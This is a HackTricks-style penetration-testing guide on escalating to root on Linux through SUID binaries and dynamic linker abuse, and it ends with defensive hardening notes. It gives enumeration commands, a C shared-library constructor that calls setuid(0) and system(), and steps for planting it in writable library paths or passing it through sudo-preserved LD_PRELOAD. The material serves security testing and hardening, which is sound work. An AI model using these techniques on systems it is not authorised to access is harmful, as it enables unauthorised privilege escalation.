---
title: "SUID Shared Library and Linker Abuse"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/linux-hardening/interesting-files-permissions/suid-shared-library-and-linker-abuse.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: linux
---

## Fast Enumeration

Start by finding unusual SUID files and checking whether they are dynamically linked:[\[1\]](#references)[\[3\]](#references)

```
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Focus on non-standard locations, custom application paths, binaries owned by root but outside package-managed directories, and dependencies loaded from writable directories.[\[1\]](#references)

Useful writeability checks:

```
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

Some custom SUID binaries try to load a shared object that does not exist. If the missing path is under a directory controlled by the attacker, the binary may load attacker-supplied code as the effective user.[\[1\]](#references)

Find failed library lookups with `strace`’s syscall filter:[\[2\]](#references)

```
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
If the binary searches a writable path for `libexample.so`, a minimal proof library can use a constructor. Keep proof-of-impact harmless during validation:[\[6\]](#references)

```
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor))
static void init(void) {
    setuid(0);
    setgid(0);
    system("id > /tmp/suid-so-ran");
}
```
Build it with the exact filename the binary tries to load:

```
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
The exploitable condition is not the missing library alone. The attacker must be able to place a compatible shared object at a path the privileged loader will accept.[\[1\]](#references)

## Writable Library Directory

Sometimes all dependencies exist, but one of the directories used to resolve them is writable. This may allow replacing a loaded library or planting a higher-priority library with the same name.[\[1\]](#references)

Review dependency paths:[\[1\]](#references)[\[3\]](#references)

```
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
If the directory is writable, validate with a copy-safe approach in a lab. Replacing system libraries on a live host can leave concurrently starting processes with inconsistent library versions.[\[8\]](#references)

## RPATH and RUNPATH

`RPATH` and `RUNPATH` are dynamic-section entries that tell the loader where to search for libraries. They are dangerous in SUID programs when they point to attacker-writable directories.[\[1\]](#references)

```
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Example risky output:

```
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
If `/opt/app/lib` is writable and the binary needs `libcustom.so`, the attacker may be able to place a malicious `libcustom.so` there:[\[1\]](#references)

```
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` and `RUNPATH` are not identical in all resolution details, but for privilege-escalation review the practical question is the same: does the SUID binary search an attacker-writable directory for a library name?[\[1\]](#references)

## LD_PRELOAD, LD_LIBRARY_PATH and SUID

For normal programs, `LD_PRELOAD` and `LD_LIBRARY_PATH` can force or influence shared object loading. For SUID programs, the dynamic loader normally enters secure-execution mode and ignores dangerous environment variables.[\[1\]](#references)

This means a plain SUID binary is usually not vulnerable just because the user can set `LD_PRELOAD`:[\[1\]](#references)

```
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
The common exception is a sudo policy that permits setting or preserving loader variables for the target command. Inspect `sudo -l` for entries such as `env_keep+=LD_PRELOAD` or `env_keep+=LD_LIBRARY_PATH`; if the target is dynamically linked, it may load attacker-controlled code:[\[4\]](#references)[\[5\]](#references)

```
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
Do not confuse these cases; the loader and sudo policy rules above distinguish them:[\[1\]](#references)[\[4\]](#references)[\[5\]](#references)

- `LD_PRELOAD` against a normal SUID binary: usually blocked by secure execution.
- `LD_PRELOAD` preserved by sudo: potentially exploitable.
- Missing `.so` in a writable path: exploitable when the SUID binary naturally loads that path.
- `RPATH` /`RUNPATH` to a writable directory: exploitable when a needed library can be controlled.
- `/etc/ld.so.preload` or linker config write access: system-wide and high impact.

## Linker Configuration

`ld.so` uses the linker cache and `/etc/ld.so.preload`; `ldconfig` builds that cache from `/etc/ld.so.conf` and files included from it, commonly `/etc/ld.so.conf.d/`.[\[1\]](#references)[\[7\]](#references)[\[8\]](#references)

High-value checks:

```
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Writable linker configuration is usually more serious than a single vulnerable SUID binary because it can affect many dynamically linked processes. `/etc/ld.so.preload` is especially dangerous because it can force a shared object into privileged processes.[\[1\]](#references)[\[7\]](#references)[\[8\]](#references)

## SUID Hardlink Confusion

Hardlinks can make the same SUID inode appear under multiple names.<sup>[\[9\]](#references)</sup> This is useful for hiding a privileged helper, confusing cleanup, or bypassing naive path-based review.

Find SUID files with more than one link:[\[9\]](#references)

```
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Inspect all paths to the same inode:[\[9\]](#references)

```
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
The abuse is not that a hardlink changes permissions. The abuse is path confusion: a privileged inode may be reachable through a name that defenders or scripts do not expect.<sup>[\[9\]](#references)</sup> For deeper inode and hardlink workflow, see [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.html).

## Defensive Notes

- Keep SUID binaries minimal, audited, and package-managed where possible.
- Avoid `RPATH` /`RUNPATH` entries pointing to writable or application-managed directories.<sup>[\[1\]](#references)[\[8\]](#references)</sup>
- Keep library directories root-owned and non-writable by regular users.<sup>[\[8\]](#references)</sup>
- Do not preserve `LD_PRELOAD` ,`LD_LIBRARY_PATH` , or similar loader variables through sudo.<sup>[\[1\]](#references)[\[5\]](#references)</sup>
- Monitor `/etc/ld.so.preload` ,`/etc/ld.so.conf` ,`/etc/ld.so.conf.d/` , and unexpected SUID files.<sup>[\[1\]](#references)[\[7\]](#references)[\[8\]](#references)</sup>
- Review hardlinked SUID files and investigate custom SUID wrappers outside standard system paths.<sup>[\[9\]](#references)</sup>

## References

- [1] [ld.so(8) — Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [strace(1) — Linux manual page](https://man7.org/linux/man-pages/man1/strace.1.html)
- [3] [readelf (GNU Binary Utilities)](https://sourceware.org/binutils/docs/binutils/readelf.html)
- [4] [sudo(8) — Linux manual page](https://www.man7.org/linux/man-pages/man8/sudo.8.html)
- [5] [sudoers(5) — Linux manual page](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [6] [Common Attributes (GCC)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [7] [ldconfig(8) — Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [8] [Dynamic Linker Hardening (The GNU C Library)](https://www.sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [9] [Hard Links (GNU Findutils)](https://www.gnu.org/software/findutils/manual/html_node/find_html/Hard-Links.html)
- [10] [objdump (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/objdump.html)
